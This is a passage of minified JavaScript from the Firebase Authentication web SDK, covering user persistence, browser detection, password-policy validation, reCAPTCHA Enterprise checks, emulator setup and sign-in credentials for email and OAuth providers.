this.persistence._set(this.fullPersistenceKey,this.persistence.type)}async setPersistence(e){if(this.persistence===e)return;const t=await this.getCurrentUser();if(await this.removeCurrentUser(),this.persistence=e,t)return this.setCurrentUser(t)}delete(){this.persistence._removeListener(this.fullUserKey,this.boundEventHandler)}static async create(e,t,n="authUser"){if(!t.length)return new Ac(Bo(B2),e,n);const i=(await Promise.all(t.map(async p=>{if(await p._isAvailable())return p}))).filter(p=>p);let r=i[0]||Bo(B2);const l=Ff(n,e.config.apiKey,e.name);let u=null;for(const p of t)try{const f=await p._get(l);if(f){let h;if(typeof f=="string"){const E=await Th(e,{idToken:f}).catch(()=>{});if(!E)break;h=await vi._fromGetAccountInfoResponse(e,E,f)}else h=vi._fromJSON(e,f);p!==r&&(u=h),r=p;break}}catch{}const d=i.filter(p=>p._shouldAllowMigration);return!r._shouldAllowMigration||!d.length?new Ac(r,e,n):(r=d[0],u&&await r._set(l,u.toJSON()),await Promise.all(t.map(async p=>{if(p!==r)try{await p._remove(l)}catch{}})),new Ac(r,e,n))}}function F2(a){const e=a.toLowerCase();if(e.includes("opera/")||e.includes("opr/")||e.includes("opios/"))return"Opera";if(dj(e))return"IEMobile";if(e.includes("msie")||e.includes("trident/"))return"IE";if(e.includes("edge/"))return"Edge";if(lj(e))return"Firefox";if(e.includes("silk/"))return"Silk";if(mj(e))return"Blackberry";if(fj(e))return"Webos";if(cj(e))return"Safari";if((e.includes("chrome/")||uj(e))&&!e.includes("edge/"))return"Chrome";if(pj(e))return"Android";{const t=/([a-zA-Z\d\.]+)\/[a-zA-Z\d\.]*$/,n=a.match(t);if(n?.length===2)return n[1]}return"Other"}function lj(a=Qt()){return/firefox\//i.test(a)}function cj(a=Qt()){const e=a.toLowerCase();return e.includes("safari/")&&!e.includes("chrome/")&&!e.includes("crios/")&&!e.includes("android")}function uj(a=Qt()){return/crios\//i.test(a)}function dj(a=Qt()){return/iemobile/i.test(a)}function pj(a=Qt()){return/android/i.test(a)}function mj(a=Qt()){return/blackberry/i.test(a)}function fj(a=Qt()){return/webos/i.test(a)}function KE(a=Qt()){return/iphone|ipad|ipod/i.test(a)||/macintosh/i.test(a)&&/mobile/i.test(a)}function $z(a=Qt()){return KE(a)&&!!window.navigator?.standalone}function Xz(){return BO()&&document.documentMode===10}function hj(a=Qt()){return KE(a)||pj(a)||fj(a)||mj(a)||/windows phone/i.test(a)||dj(a)}function gj(a,e=[]){let t;switch(a){case"Browser":t=F2(Qt());break;case"Worker":t=`${F2(Qt())}-${a}`;break;default:t=a}const n=e.length?e.join(","):"FirebaseCore-web";return`${t}/JsCore/${Bc}/${n}`}class Zz{constructor(e){this.auth=e,this.queue=[]}pushCallback(e,t){const n=r=>new Promise((l,u)=>{try{const d=e(r);l(d)}catch(d){u(d)}});n.onAbort=t,this.queue.push(n);const i=this.queue.length-1;return()=>{this.queue[i]=()=>Promise.resolve()}}async runMiddleware(e){if(this.auth.currentUser===e)return;const t=[];try{for(const n of this.queue)await n(e),n.onAbort&&t.push(n.onAbort)}catch(n){t.reverse();for(const i of t)try{i()}catch{}throw this.auth._errorFactory.create("login-blocked",{originalMessage:n?.message})}}}async function eB(a,e={}){return ir(a,"GET","/v2/passwordPolicy",nr(a,e))}const aB=6;class tB{constructor(e){const t=e.customStrengthOptions;this.customStrengthOptions={},this.customStrengthOptions.minPasswordLength=t.minPasswordLength??aB,t.maxPasswordLength&&(this.customStrengthOptions.maxPasswordLength=t.maxPasswordLength),t.containsLowercaseCharacter!==void 0&&(this.customStrengthOptions.containsLowercaseLetter=t.containsLowercaseCharacter),t.containsUppercaseCharacter!==void 0&&(this.customStrengthOptions.containsUppercaseLetter=t.containsUppercaseCharacter),t.containsNumericCharacter!==void 0&&(this.customStrengthOptions.containsNumericCharacter=t.containsNumericCharacter),t.containsNonAlphanumericCharacter!==void 0&&(this.customStrengthOptions.containsNonAlphanumericCharacter=t.containsNonAlphanumericCharacter),this.enforcementState=e.enforcementState,this.enforcementState==="ENFORCEMENT_STATE_UNSPECIFIED"&&(this.enforcementState="OFF"),this.allowedNonAlphanumericCharacters=e.allowedNonAlphanumericCharacters?.join("")??"",this.forceUpgradeOnSignin=e.forceUpgradeOnSignin??!1,this.schemaVersion=e.schemaVersion}validatePassword(e){const t={isValid:!0,passwordPolicy:this};return this.validatePasswordLengthOptions(e,t),this.validatePasswordCharacterOptions(e,t),t.isValid&&(t.isValid=t.meetsMinPasswordLength??!0),t.isValid&&(t.isValid=t.meetsMaxPasswordLength??!0),t.isValid&&(t.isValid=t.containsLowercaseLetter??!0),t.isValid&&(t.isValid=t.containsUppercaseLetter??!0),t.isValid&&(t.isValid=t.containsNumericCharacter??!0),t.isValid&&(t.isValid=t.containsNonAlphanumericCharacter??!0),t}validatePasswordLengthOptions(e,t){const n=this.customStrengthOptions.minPasswordLength,i=this.customStrengthOptions.maxPasswordLength;n&&(t.meetsMinPasswordLength=e.length>=n),i&&(t.meetsMaxPasswordLength=e.length<=i)}validatePasswordCharacterOptions(e,t){this.updatePasswordCharacterOptionsStatuses(t,!1,!1,!1,!1);let n;for(let i=0;i<e.length;i++)n=e.charAt(i),this.updatePasswordCharacterOptionsStatuses(t,n>="a"&&n<="z",n>="A"&&n<="Z",n>="0"&&n<="9",this.allowedNonAlphanumericCharacters.includes(n))}updatePasswordCharacterOptionsStatuses(e,t,n,i,r){this.customStrengthOptions.containsLowercaseLetter&&(e.containsLowercaseLetter||(e.containsLowercaseLetter=t)),this.customStrengthOptions.containsUppercaseLetter&&(e.containsUppercaseLetter||(e.containsUppercaseLetter=n)),this.customStrengthOptions.containsNumericCharacter&&(e.containsNumericCharacter||(e.containsNumericCharacter=i)),this.customStrengthOptions.containsNonAlphanumericCharacter&&(e.containsNonAlphanumericCharacter||(e.containsNonAlphanumericCharacter=r))}}class nB{constructor(e,t,n,i){this.app=e,this.heartbeatServiceProvider=t,this.appCheckServiceProvider=n,this.config=i,this.currentUser=null,this.emulatorConfig=null,this.operations=Promise.resolve(),this.authStateSubscription=new V2(this),this.idTokenSubscription=new V2(this),this.beforeStateQueue=new Zz(this),this.redirectUser=null,this.isProactiveRefreshEnabled=!1,this.EXPECTED_PASSWORD_POLICY_SCHEMA_VERSION=1,this._canInitEmulator=!0,this._isInitialized=!1,this._deleted=!1,this._initializationPromise=null,this._popupRedirectResolver=null,this._errorFactory=tj,this._agentRecaptchaConfig=null,this._tenantRecaptchaConfigs={},this._projectPasswordPolicy=null,this._tenantPasswordPolicies={},this._resolvePersistenceManagerAvailable=void 0,this.lastNotifiedUid=void 0,this.languageCode=null,this.tenantId=null,this.settings={appVerificationDisabledForTesting:!1},this.frameworks=[],this.name=e.name,this.clientVersion=i.sdkClientVersion,this._persistenceManagerAvailable=new Promise(r=>this._resolvePersistenceManagerAvailable=r)}_initializeWithPersistence(e,t){return t&&(this._popupRedirectResolver=Bo(t)),this._initializationPromise=this.queue(async()=>{if(!this._deleted&&(this.persistenceManager=await Ac.create(this,e),this._resolvePersistenceManagerAvailable?.(),!this._deleted)){if(this._popupRedirectResolver?._shouldInitProactively)try{await this._popupRedirectResolver._initialize(this)}catch{}await this.initializeCurrentUser(t),this.lastNotifiedUid=this.currentUser?.uid||null,!this._deleted&&(this._isInitialized=!0)}}),this._initializationPromise}async _onStorageEvent(){if(this._deleted)return;const e=await this.assertedPersistence.getCurrentUser();if(!(!this.currentUser&&!e)){if(this.currentUser&&e&&this.currentUser.uid===e.uid){this._currentUser._assign(e),await this.currentUser.getIdToken();return}await this._updateCurrentUser(e,!0)}}async initializeCurrentUserFromIdToken(e){try{const t=await Th(this,{idToken:e}),n=await vi._fromGetAccountInfoResponse(this,t,e);await this.directlySetCurrentUser(n)}catch(t){console.warn("FirebaseServerApp could not login user with provided authIdToken: ",t),await this.directlySetCurrentUser(null)}}async initializeCurrentUser(e){if(wn(this.app)){const r=this.app.settings.authIdToken;return r?new Promise(l=>{setTimeout(()=>this.initializeCurrentUserFromIdToken(r).then(l,l))}):this.directlySetCurrentUser(null)}const t=await this.assertedPersistence.getCurrentUser();let n=t,i=!1;if(e&&this.config.authDomain){await this.getOrInitRedirectPersistenceManager();const r=this.redirectUser?._redirectEventId,l=n?._redirectEventId,u=await this.tryRedirectSignIn(e);(!r||r===l)&&u?.user&&(n=u.user,i=!0)}if(!n)return this.directlySetCurrentUser(null);if(!n._redirectEventId){if(i)try{await this.beforeStateQueue.runMiddleware(n)}catch(r){n=t,this._popupRedirectResolver._overrideRedirectResult(this,()=>Promise.reject(r))}return n?this.reloadAndSetCurrentUserOrClear(n):this.directlySetCurrentUser(null)}return He(this._popupRedirectResolver,this,"argument-error"),await this.getOrInitRedirectPersistenceManager(),this.redirectUser&&this.redirectUser._redirectEventId===n._redirectEventId?this.directlySetCurrentUser(n):this.reloadAndSetCurrentUserOrClear(n)}async tryRedirectSignIn(e){let t=null;try{t=await this._popupRedirectResolver._completeRedirectFn(this,e,!0)}catch{await this._setRedirectUser(null)}return t}async reloadAndSetCurrentUserOrClear(e){try{await xh(e)}catch(t){if(t?.code!=="auth/network-request-failed")return this.directlySetCurrentUser(null)}return this.directlySetCurrentUser(e)}useDeviceLanguage(){this.languageCode=_z()}async _delete(){this._deleted=!0}async updateCurrentUser(e){if(wn(this.app))return Promise.reject(Vo(this));const t=e?bn(e):null;return t&&He(t.auth.config.apiKey===this.config.apiKey,this,"invalid-user-token"),this._updateCurrentUser(t&&t._clone(this))}async _updateCurrentUser(e,t=!1){if(!this._deleted)return e&&He(this.tenantId===e.tenantId,this,"tenant-id-mismatch"),t||await this.beforeStateQueue.runMiddleware(e),this.queue(async()=>{await this.directlySetCurrentUser(e),this.notifyAuthListeners()})}async signOut(){return wn(this.app)?Promise.reject(Vo(this)):(await this.beforeStateQueue.runMiddleware(null),(this.redirectPersistenceManager||this._popupRedirectResolver)&&await this._setRedirectUser(null),this._updateCurrentUser(null,!0))}setPersistence(e){return wn(this.app)?Promise.reject(Vo(this)):this.queue(async()=>{await this.assertedPersistence.setPersistence(Bo(e))})}_getRecaptchaConfig(){return this.tenantId==null?this._agentRecaptchaConfig:this._tenantRecaptchaConfigs[this.tenantId]}async validatePassword(e){this._getPasswordPolicyInternal()||await this._updatePasswordPolicy();const t=this._getPasswordPolicyInternal();return t.schemaVersion!==this.EXPECTED_PASSWORD_POLICY_SCHEMA_VERSION?Promise.reject(this._errorFactory.create("unsupported-password-policy-schema-version",{})):t.validatePassword(e)}_getPasswordPolicyInternal(){return this.tenantId===null?this._projectPasswordPolicy:this._tenantPasswordPolicies[this.tenantId]}async _updatePasswordPolicy(){const e=await eB(this),t=new tB(e);this.tenantId===null?this._projectPasswordPolicy=t:this._tenantPasswordPolicies[this.tenantId]=t}_getPersistenceType(){return this.assertedPersistence.persistence.type}_getPersistence(){return this.assertedPersistence.persistence}_updateErrorMap(e){this._errorFactory=new bp("auth","Firebase",e())}onAuthStateChanged(e,t,n){return this.registerStateListener(this.authStateSubscription,e,t,n)}beforeAuthStateChanged(e,t){return this.beforeStateQueue.pushCallback(e,t)}onIdTokenChanged(e,t,n){return this.registerStateListener(this.idTokenSubscription,e,t,n)}authStateReady(){return new Promise((e,t)=>{if(this.currentUser)e();else{const n=this.onAuthStateChanged(()=>{n(),e()},t)}})}async revokeAccessToken(e){if(this.currentUser){const t=await this.currentUser.getIdToken(),n={providerId:"apple.com",tokenType:"ACCESS_TOKEN",token:e,idToken:t};this.tenantId!=null&&(n.tenantId=this.tenantId),await Yz(this,n)}}toJSON(){return{apiKey:this.config.apiKey,authDomain:this.config.authDomain,appName:this.name,currentUser:this._currentUser?.toJSON()}}async _setRedirectUser(e,t){const n=await this.getOrInitRedirectPersistenceManager(t);return e===null?n.removeCurrentUser():n.setCurrentUser(e)}async getOrInitRedirectPersistenceManager(e){if(!this.redirectPersistenceManager){const t=e&&Bo(e)||this._popupRedirectResolver;He(t,this,"argument-error"),this.redirectPersistenceManager=await Ac.create(this,[Bo(t._redirectPersistence)],"redirectUser"),this.redirectUser=await this.redirectPersistenceManager.getCurrentUser()}return this.redirectPersistenceManager}async _redirectUserForId(e){return this._isInitialized&&await this.queue(async()=>{}),this._currentUser?._redirectEventId===e?this._currentUser:this.redirectUser?._redirectEventId===e?this.redirectUser:null}async _persistUserIfCurrent(e){if(e===this.currentUser)return this.queue(async()=>this.directlySetCurrentUser(e))}_notifyListenersIfCurrent(e){e===this.currentUser&&this.notifyAuthListeners()}_key(){return`${this.config.authDomain}:${this.config.apiKey}:${this.name}`}_startProactiveRefresh(){this.isProactiveRefreshEnabled=!0,this.currentUser&&this._currentUser._startProactiveRefresh()}_stopProactiveRefresh(){this.isProactiveRefreshEnabled=!1,this.currentUser&&this._currentUser._stopProactiveRefresh()}get _currentUser(){return this.currentUser}notifyAuthListeners(){if(!this._isInitialized)return;this.idTokenSubscription.next(this.currentUser);const e=this.currentUser?.uid??null;this.lastNotifiedUid!==e&&(this.lastNotifiedUid=e,this.authStateSubscription.next(this.currentUser))}registerStateListener(e,t,n,i){if(this._deleted)return()=>{};const r=typeof t=="function"?t:t.next.bind(t);let l=!1;const u=this._isInitialized?Promise.resolve():this._initializationPromise;if(He(u,this,"internal-error"),u.then(()=>{l||r(this.currentUser)}),typeof t=="function"){const d=e.addObserver(t,n,i);return()=>{l=!0,d()}}else{const d=e.addObserver(t);return()=>{l=!0,d()}}}async directlySetCurrentUser(e){this.currentUser&&this.currentUser!==e&&this._currentUser._stopProactiveRefresh(),e&&this.isProactiveRefreshEnabled&&e._startProactiveRefresh(),this.currentUser=e,e?await this.assertedPersistence.setCurrentUser(e):await this.assertedPersistence.removeCurrentUser()}queue(e){return this.operations=this.operations.then(e,e),this.operations}get assertedPersistence(){return He(this.persistenceManager,this,"internal-error"),this.persistenceManager}_logFramework(e){!e||this.frameworks.includes(e)||(this.frameworks.push(e),this.frameworks.sort(),this.clientVersion=gj(this.config.clientPlatform,this._getFrameworks()))}_getFrameworks(){return this.frameworks}async _getAdditionalHeaders(){const e={"X-Client-Version":this.clientVersion};this.app.options.appId&&(e["X-Firebase-gmpid"]=this.app.options.appId);const t=await this.heartbeatServiceProvider.getImmediate({optional:!0})?.getHeartbeatsHeader();t&&(e["X-Firebase-Client"]=t);const n=await this._getAppCheckToken();return n&&(e["X-Firebase-AppCheck"]=n),e}async _getAppCheckToken(){if(wn(this.app)&&this.app.settings.appCheckToken)return this.app.settings.appCheckToken;const e=await this.appCheckServiceProvider.getImmediate({optional:!0})?.getToken();return e?.error&&jz(`Error while retrieving App Check token: ${e.error}`),e?.token}}function or(a){return bn(a)}class V2{constructor(e){this.auth=e,this.observer=null,this.addObserver=KO(t=>this.observer=t)}get next(){return He(this.observer,this.auth,"internal-error"),this.observer.next.bind(this.observer)}}let rg={async loadJS(){throw new Error("Unable to load external scripts")},recaptchaV2Script:"",recaptchaEnterpriseScript:"",gapiScript:""};function iB(a){rg=a}function bj(a){return rg.loadJS(a)}function oB(){return rg.recaptchaEnterpriseScript}function sB(){return rg.gapiScript}function rB(a){return`__${a}${Math.floor(Math.random()*1e6)}`}class lB{constructor(){this.enterprise=new cB}ready(e){e()}execute(e,t){return Promise.resolve("token")}render(e,t){return""}}class cB{ready(e){e()}execute(e,t){return Promise.resolve("token")}render(e,t){return""}}const uB="recaptcha-enterprise",vj="NO_RECAPTCHA";class dB{constructor(e){this.type=uB,this.auth=or(e)}async verify(e="verify",t=!1){async function n(r){if(!t){if(r.tenantId==null&&r._agentRecaptchaConfig!=null)return r._agentRecaptchaConfig.siteKey;if(r.tenantId!=null&&r._tenantRecaptchaConfigs[r.tenantId]!==void 0)return r._tenantRecaptchaConfigs[r.tenantId].siteKey}return new Promise(async(l,u)=>{Fz(r,{clientType:"CLIENT_TYPE_WEB",version:"RECAPTCHA_ENTERPRISE"}).then(d=>{if(d.recaptchaKey===void 0)u(new Error("recaptcha Enterprise site key undefined"));else{const p=new Bz(d);return r.tenantId==null?r._agentRecaptchaConfig=p:r._tenantRecaptchaConfigs[r.tenantId]=p,l(p.siteKey)}}).catch(d=>{u(d)})})}function i(r,l,u){const d=window.grecaptcha;O2(d)?d.enterprise.ready(()=>{d.enterprise.execute(r,{action:e}).then(p=>{l(p)}).catch(()=>{l(vj)})}):u(Error("No reCAPTCHA enterprise script loaded."))}return this.auth.settings.appVerificationDisabledForTesting?new lB().execute("siteKey",{action:"verify"}):new Promise((r,l)=>{n(this.auth).then(u=>{if(!t&&O2(window.grecaptcha))i(u,r,l);else{if(typeof window>"u"){l(new Error("RecaptchaVerifier is only supported in browser"));return}let d=oB();d.length!==0&&(d+=u),bj(d).then(()=>{i(u,r,l)}).catch(p=>{l(p)})}}).catch(u=>{l(u)})})}}async function H2(a,e,t,n=!1,i=!1){const r=new dB(a);let l;if(i)l=vj;else try{l=await r.verify(t)}catch{l=await r.verify(t,!0)}const u={...e};if(t==="mfaSmsEnrollment"||t==="mfaSmsSignIn"){if("phoneEnrollmentInfo"in u){const d=u.phoneEnrollmentInfo.phoneNumber,p=u.phoneEnrollmentInfo.recaptchaToken;Object.assign(u,{phoneEnrollmentInfo:{phoneNumber:d,recaptchaToken:p,captchaResponse:l,clientType:"CLIENT_TYPE_WEB",recaptchaVersion:"RECAPTCHA_ENTERPRISE"}})}else if("phoneSignInInfo"in u){const d=u.phoneSignInInfo.recaptchaToken;Object.assign(u,{phoneSignInInfo:{recaptchaToken:d,captchaResponse:l,clientType:"CLIENT_TYPE_WEB",recaptchaVersion:"RECAPTCHA_ENTERPRISE"}})}return u}return n?Object.assign(u,{captchaResp:l}):Object.assign(u,{captchaResponse:l}),Object.assign(u,{clientType:"CLIENT_TYPE_WEB"}),Object.assign(u,{recaptchaVersion:"RECAPTCHA_ENTERPRISE"}),u}async function h0(a,e,t,n,i){if(a._getRecaptchaConfig()?.isProviderEnabled("EMAIL_PASSWORD_PROVIDER")){const r=await H2(a,e,t,t==="getOobCode");return n(a,r)}else return n(a,e).catch(async r=>{if(r.code==="auth/missing-recaptcha-token"){console.log(`${t} is protected by reCAPTCHA Enterprise for this project. Automatically triggering the reCAPTCHA flow and restarting the flow.`);const l=await H2(a,e,t,t==="getOobCode");return n(a,l)}else return Promise.reject(r)})}function pB(a,e){const t=hE(a,"auth");if(t.isInitialized()){const i=t.getImmediate(),r=t.getOptions();if(nl(r,e??{}))return i;Zn(i,"already-initialized")}return t.initialize({options:e})}function mB(a,e){const t=e?.persistence||[],n=(Array.isArray(t)?t:[t]).map(Bo);e?.errorMap&&a._updateErrorMap(e.errorMap),a._initializeWithPersistence(n,e?.popupRedirectResolver)}function fB(a,e,t){const n=or(a);He(/^https?:\/\//.test(e),n,"invalid-emulator-scheme");const i=!1,r=yj(e),{host:l,port:u}=hB(e),d=u===null?"":`:${u}`,p={url:`${r}//${l}${d}/`},f=Object.freeze({host:l,port:u,protocol:r.replace(":",""),options:Object.freeze({disableWarnings:i})});if(!n._canInitEmulator){He(n.config.emulator&&n.emulatorConfig,n,"emulator-config-failed"),He(nl(p,n.config.emulator)&&nl(f,n.emulatorConfig),n,"emulator-config-failed");return}n.config.emulator=p,n.emulatorConfig=f,n.settings.appVerificationDisabledForTesting=!0,zc(l)?(fI(`${r}//${l}${d}`),hI("Auth",!0)):gB()}function yj(a){const e=a.indexOf(":");return e<0?"":a.substr(0,e+1)}function hB(a){const e=yj(a),t=/(\/\/)?([^?#/]+)/.exec(a.substr(e.length));if(!t)return{host:"",port:null};const n=t[2].split("@").pop()||"",i=/^(\[[^\]]+\])(:|$)/.exec(n);if(i){const r=i[1];return{host:r,port:G2(n.substr(r.length+1))}}else{const[r,l]=n.split(":");return{host:r,port:G2(l)}}}function G2(a){if(!a)return null;const e=Number(a);return isNaN(e)?null:e}function gB(){function a(){const e=document.createElement("p"),t=e.style;e.innerText="Running in emulator mode. Do not use with production credentials.",t.position="fixed",t.width="100%",t.backgroundColor="#ffffff",t.border=".1em solid #000000",t.color="#b50000",t.bottom="0px",t.left="0px",t.margin="0px",t.zIndex="10000",t.textAlign="center",e.classList.add("firebase-emulator-warning"),document.body.appendChild(e)}typeof console<"u"&&typeof console.info=="function"&&console.info("WARNING: You are using the Auth Emulator, which is intended for local testing only.  Do not use with production credentials."),typeof window<"u"&&typeof document<"u"&&(document.readyState==="loading"?window.addEventListener("DOMContentLoaded",a):a())}class YE{constructor(e,t){this.providerId=e,this.signInMethod=t}toJSON(){return zo("not implemented")}_getIdTokenResponse(e){return zo("not implemented")}_linkToIdToken(e,t){return zo("not implemented")}_getReauthenticationResolver(e){return zo("not implemented")}}async function bB(a,e){return ir(a,"POST","/v1/accounts:signUp",e)}async function vB(a,e){return Ap(a,"POST","/v1/accounts:signInWithPassword",nr(a,e))}async function yB(a,e){return Ap(a,"POST","/v1/accounts:signInWithEmailLink",nr(a,e))}async function EB(a,e){return Ap(a,"POST","/v1/accounts:signInWithEmailLink",nr(a,e))}class sp extends YE{constructor(e,t,n,i=null){super("password",n),this._email=e,this._password=t,this._tenantId=i}static _fromEmailAndPassword(e,t){return new sp(e,t,"password")}static _fromEmailAndCode(e,t,n=null){return new sp(e,t,"emailLink",n)}toJSON(){return{email:this._email,password:this._password,signInMethod:this.signInMethod,tenantId:this._tenantId}}static fromJSON(e){const t=typeof e=="string"?JSON.parse(e):e;if(t?.email&&t?.password){if(t.signInMethod==="password")return this._fromEmailAndPassword(t.email,t.password);if(t.signInMethod==="emailLink")return this._fromEmailAndCode(t.email,t.password,t.tenantId)}return null}async _getIdTokenResponse(e){switch(this.signInMethod){case"password":const t={returnSecureToken:!0,email:this._email,password:this._password,clientType:"CLIENT_TYPE_WEB"};return h0(e,t,"signInWithPassword",vB);case"emailLink":return yB(e,{email:this._email,oobCode:this._password});default:Zn(e,"internal-error")}}async _linkToIdToken(e,t){switch(this.signInMethod){case"password":const n={idToken:t,returnSecureToken:!0,email:this._email,password:this._password,clientType:"CLIENT_TYPE_WEB"};return h0(e,n,"signUpPassword",bB);case"emailLink":return EB(e,{idToken:t,email:this._email,oobCode:this._password});default:Zn(e,"internal-error")}}_getReauthenticationResolver(e){return this._getIdTokenResponse(e)}}async function Pc(a,e){return Ap(a,"POST","/v1/accounts:signInWithIdp",nr(a,e))}const SB="http://localhost";class ll extends YE{constructor(){super(...arguments),this.pendingToken=null}static _fromParams(e){const t=new ll(e.providerId,e.signInMethod);return e.idToken||e.accessToken?(e.idToken&&(t.idToken=e.idToken),e.accessToken&&(t.accessToken=e.accessToken),e.nonce&&!e.pendingToken&&(t.nonce=e.nonce),e.pendingToken&&(t.pendingToken=e.pendingToken)):e.oauthToken&&e.oauthTokenSecret?(t.accessToken=e.oauthToken,t.secret=e.oauthTokenSecret):Zn("argument-error"),t}toJSON(){return{idToken:this.idToken,accessToken:this.accessToken,secret:this.secret,nonce:this.nonce,pendingToken:this.pendingToken,providerId:this.providerId,signInMethod:this.signInMethod}}static fromJSON(e){const t=typeof e=="string"?JSON.parse(e):e,{providerId:n,signInMethod:i,...r}=t;if(!n||!i)return null;const l=new ll(n,i);return l.idToken=r.idToken||void 0,l.accessToken=r.accessToken||void 0,l.secret=r.secret,l.nonce=r.nonce,l.pendingToken=r.pendingToken||null,l}_getIdTokenResponse(e){const t=this.buildRequest();return Pc(e,t)}_linkToIdToken(e,t){const n=this.buildRequest();return n.idToken=t,Pc(e,n)}_getReauthenticationResolver(e){const t=this.buildRequest();return t.autoCreate=!1,Pc(e,t)}buildRequest(){const e={requestUri:SB,returnSecureToken:!0};if(this.pendingToken)e.pendingToken=this.pendingToken;else{const t={};this.idToken&&(t.id_token=this.idToken),this.accessToken&&(t.access_token=this.accessToken),this.secret&&(t.oauth_token_secret=this.secret),t.providerId=this.providerId,this.nonce&&!this.pendingToken&&(t.nonce=this.nonce),e.postBody=vp(t)}return e}}function CB(a){switch(a){case"recoverEmail":return"RECOVER_EMAIL";case"resetPassword":return"PASSWORD_RESET";case"signIn":return"EMAIL_SIGNIN";case"verifyEmail":return"VERIFY_EMAIL";case"verifyAndChangeEmail":return"VERIFY_AND_CHANGE_EMAIL";case"revertSecondFactorAddition":return"REVERT_SECOND_FACTOR_ADDITION";default:return null}}function TB(a){const e=bd(vd(a)).link,t=e?bd(vd(e)).deep_link_id:null,n=bd(vd(a)).deep_link_id;return(n?bd(vd(n)).link:null)||n||t||e||a}class $E{constructor(e){const t=bd(vd(e)),n=t.apiKey??null,i=t.oobCode??null,r=CB(t.mode??null);He(n&&i&&r,"argument-error"),this.apiKey=n,this.operation=r,this.code=i,this.continueUrl=t.continueUrl??null,this.languageCode=t.lang??null,this.tenantId=t.tenantId??null}static parseLink(e){const t=TB(e);try{return new $E(t)}catch{return null}}}class Qc{constructor(){this.providerId=Qc.PROVIDER_ID}static credential(e,t){return sp._fromEmailAndPassword(e,t)}static credentialWithLink(e,t){const n=$E.parseLink(t);return He(n,"argument-error"),sp._fromEmailAndCode(e,n.code,n.tenantId)}}Qc.PROVIDER_ID="password";Qc.EMAIL_PASSWORD_SIGN_IN_METHOD="password";Qc.EMAIL_LINK_SIGN_IN_METHOD="emailLink";class XE{constructor(e){this.providerId=e,this.defaultLanguageCode=null,this.customParameters={}}setDefaultLanguage(e){this.defaultLanguageCode=e}setCustomParameters(e){return this.customParameters=e,this}getCustomParameters(){return this.customParameters}}class Pp extends XE{constructor(){super(...arguments),this.scopes=[]}addScope(e){return this.scopes.includes(e)||this.scopes.push(e),this}getScopes(){return[...this.scopes]}}class qo extends Pp{constructor(){super("facebook.com")}static credential(e){return ll._fromParams({providerId:qo.PROVIDER_ID,signInMethod:qo.FACEBOOK_SIGN_IN_METHOD,accessToken:e})}static credentialFromResult(e){return qo.credentialFromTaggedObject(e)}static credentialFromError(e){return qo.credentialFromTaggedObject(e.customData||{})}static credentialFromTaggedObject({_tokenResponse:e}){if(!e||!("oauthAccessToken"in e)||!e.oauthAccessToken)return null;try{return qo.credential(e.oauthAccessToken)}catch{return null}}}qo.FACEBOOK_SIGN_IN_METHOD="facebook.com";qo.PROVIDER_ID="facebook.com";class ko extends Pp{constructor(){super("google.com"),this.addScope("profile")}static credential(e,t){return ll._fromParams({providerId:ko.PROVIDER_ID,signInMethod:ko.GOOGLE_SIGN_IN_METHOD,idToken:e,accessToken:t})}static credentialFromResult(e){return ko.credentialFromTaggedObject(e)}static credentialFromError(e){return ko.credentialFromTaggedObject(e.customData||{})}static credentialFromTaggedObject({_tokenResponse:e}){if(!e)return null;const{oauthIdToken:t,oauthAccessToken:n}=e;if(!t&&!n)return null;try{return ko.credential(t,n)}catch{return null}}}ko.GOOGLE_SIGN_IN_METHOD="google.com";ko.PROVIDER_ID="google.com";class Oo extends Pp{constructor(){super("github.com")}static credential(e){return ll._fromParams({providerId:Oo.PROVIDER_ID,signInMethod:Oo.GITHUB_SIGN_IN_METHOD,accessToken:e})}static credentialFromResult(e){return Oo.credentialFromTaggedObject(e)}static credentialFromError(e){return Oo.credentialFromTaggedObject(e.customData||{})}static credentialFromTaggedObject({_tokenResponse:e}){if(!e||!("oauthAccessToken"in e)||!e.oauthAccessToken)return null;try{return Oo.credential(e.oauthAccessToken)}catch{return null}}}Oo.GITHUB_SIGN_IN_METHOD="github.com";Oo.PROVIDER_ID="github.com";class zs extends Pp{constructor(){super("twitter.com")}static credential(e,t){return ll._fromParams({providerId:zs.PROVIDER_ID,signInMethod:zs.TWITTER_SIGN_IN_METHOD,oauthToken:e,oauthTokenSecret:t})}static credentialFromResult(e){return zs.credentialFromTaggedObject(e)}static credentialFromError(e){return zs.credentialFromTaggedObject(e.customData||{})}static credentialFromTaggedObject({_tokenResponse:e}){if(!e)return null;const{oauthAccessToken:t,oauthTokenSecret:n}=e;if(!t||!n)return null;try{return zs.credential(t,n)}catch{return null}}}zs.TWITTER_SIGN_IN_METHOD="twitter.com";zs.PROVIDER_ID="twitter.com";async function xB(a,e){return Ap(a,"POST","/v1/accounts:signUp",nr(a,e))}class cl{constructor(e){this.user=e.user,this.providerId=e.providerId,this._tokenResponse=e._tokenResponse,this.operationType=e.operationType}static async _fromIdTokenResponse(e,t,n,i=!1){const r=await vi._fromIdTokenResponse(e,n,i),l=Q2(n);return new cl({user:r,providerId:l,_tokenResponse:n,operationType:t})}static async _forOperation(e,t,n){await e._updateTokensIfNecessary(n,!0);const i=Q2(n);return new cl({user:e,providerId:i,_tokenResponse:n,operationType:t})}}function Q2(a){return a.providerId?a.providerId:"phoneNumber"in a?"phone":null}class Ah extends Xo{constructor(e,t,n,i){super(t.code,t.message),this.operationType=n,this.user=i,Object.setPrototypeOf(this,Ah.prototype),this.customData={appName:e.name,tenantId:e.tenantId??void 0,_serverResponse:t.customData._serverResponse,operationType:n}}static _fromErrorAndOperation(e,t,n,i){return new Ah(e,t,n,i)}}function Ej(a,e,t,n){return(e==="reauthenticate"?t._getReauthenticationResolver(a):t._getIdTokenResponse(a)).catch(r=>{throw r.code==="auth/multi-factor-auth-required"?Ah._fromErrorAndOperation(a,r,e,n):r})}async function AB(a,e,t=!1){const n=await op(a,e._linkToIdToken(a.auth,await a.getIdToken()),t);return cl._forOperation(a,"link",n)}async function PB(a,e,t=!1){const{auth:n}=a;if(wn(n.app))return Promise.reject(Vo(n));const i="reauthenticate";try{const r=await op(a,Ej(n,i,e,a),t);He(r.idToken,n,"internal-error");const l=WE(r.idToken);He(l,n,"internal-error");const{sub:u}=l;return He(a.uid===u,n,"user-mismatch"),cl._forOperation(a,i,r)}catch(r){throw r?.code==="auth/user-not-found"&&Zn(n,"user-mismatch"),r}}async function Sj(a,e,t=!1){if(wn(a.app))return Promise.reject(Vo(a));const n="signIn",i=await Ej(a,n,e),r=await cl._fromIdTokenResponse(a,n,i);return t||await a._updateCurrentUser(r.user),r}async function LB(a,e){return Sj(or(a),e)}async function Cj(a){const 